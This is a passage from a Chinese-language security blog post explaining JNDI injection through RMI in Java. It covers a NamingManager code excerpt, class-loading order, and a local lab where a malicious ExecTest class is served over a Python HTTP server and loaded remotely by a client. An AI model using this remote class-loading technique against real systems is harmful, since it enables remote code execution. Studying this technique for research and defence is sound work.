+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NamingManager.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectInstance</span><span class="params">(...)</span>&#123;<span class="comment">//在对象工厂检索由引用标识的对象，使用引用的工厂类名和工厂代码库加载到工厂的类中。</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">    <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">        factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">        <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                             environment);<span class="comment">//第二次命令执行</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>在第一次执行之后会返回ObjectFactory，这样就会调用factory类的getObjectInstance方法，从而进行了第二次命令执行</p>
+<p><strong>类加载顺序</strong><br>当前的项目结构为：<br><img src="https://s2.loli.net/2022/11/02/ybzOExlHaIJVuMK.png" alt="image.png"><br>事实上，这样结构下不需要编译ExecTest类，也不需要开启http服务只要开启Server.java，运行Client.java即可执行命令<br><img src="https://s2.loli.net/2022/11/02/JYaXM7KdHg1pw35.png" alt="image.png"><br>也就是说，我们其实并没有访问我们的远程类就完成了攻击，作为对比测试，我们将Client.java和ExecTest.java分开运行，不过运行之后没有任何命令被执行。<br><img src="https://s2.loli.net/2022/11/02/3P7gtKcfD15Fx6N.png" alt="image.png"><br>我们在刚才的Server.java服务器端编译ExecTest.java文件，并开启http服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\Workspace\java\JndiRmi\src\main\java&gt;&quot;c:\Program Files\Java\jdk1.8.0_112\bin\javac.exe&quot; ExecTest.java</span><br><span class="line">D:\Workspace\java\JndiRmi\src\main\java&gt;python -m SimpleHTTPServer 8081</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8081 ...</span><br></pre></td></tr></table></figure>
+<p>这样我们开启Server.java，然后开启另一个目录下的Client.java即可远程加载类<br><img src="https://upload-images.jianshu.io/upload_images/10354927-397ae580d6705f3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>查看http服务端可以看到我们的远程类被远程加载了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\Workspace\java\JndiRmi\src\main\java&gt;python -m SimpleHTTPServer 8081</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8081 ...</span><br><span class="line">127.0.0.1 - - [19/Dec/2021 13:57:25] &quot;GET /ExecTest.class HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<p>为什么Client位置的不同会导致类的加载位置不同呢？将Client.java单独和与ExecTest.java对比运行：<br><img src="https://s2.loli.net/2022/11/02/9AdX7MEvh84boJT.png" alt="image.png"><br>从调试可以看出，Client.java在实例化类的时候会先使用本地的类加载器进行加载，如果本地找不到的话才会找远程的代码库(codebase)进行加载，左侧在本地可以找到ExecTest类进行加载，而在右侧的本地找不到ExecTest类，会通过RMI远程加载，但是因为我们没开启http服务，所以找不到ExecTest类，导致实例化失败，无法命令执行。<br>所以，只要将ExecTest.java类与Client.java放在同一目录就不会进行远程加载。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2022/11/02/jndi-inj-rmi/">http://example.com/2022/11/02/jndi-inj-rmi/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/java/"># java</a>
+                    
+                        <a href="/tags/rmi/"># rmi</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/10/30/DASCTF202210/">DASCTF2022-10月赛题解</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
